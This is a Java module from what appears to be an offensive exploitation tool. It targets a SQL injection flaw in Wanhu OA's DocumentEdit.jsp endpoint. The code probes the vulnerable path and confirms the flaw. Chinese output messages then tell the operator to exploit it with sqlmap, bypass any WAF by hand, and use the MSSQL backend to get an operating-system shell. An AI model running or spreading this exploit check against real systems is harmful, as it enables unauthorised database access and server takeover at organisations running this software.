package Exp.OA.wanhuoa;

import Utilss.HttpTools;
import Utilss.Response;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;
import java.util.HashMap;

public class wanhu_DocumentEdit implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        textArea.appendText("\n 请自行使用sqlmap或手动利用");
        return false;
    }

    private Boolean att(String url,TextArea textArea){
        Response response = HttpTools.get(url + "/defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains("iSignature")){
            textArea.appendText("\n 漏洞存在 请使用Sqlmap利用 若存在waf 请手动绕过 \n " + url + "/defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1");
            textArea.appendText("\n 该OA所用 mssql数据库 可进行 os-shell");
            return true;
        }else {
            textArea.appendText("wanhuoa_DocumentEdit-SQLli-漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }
}
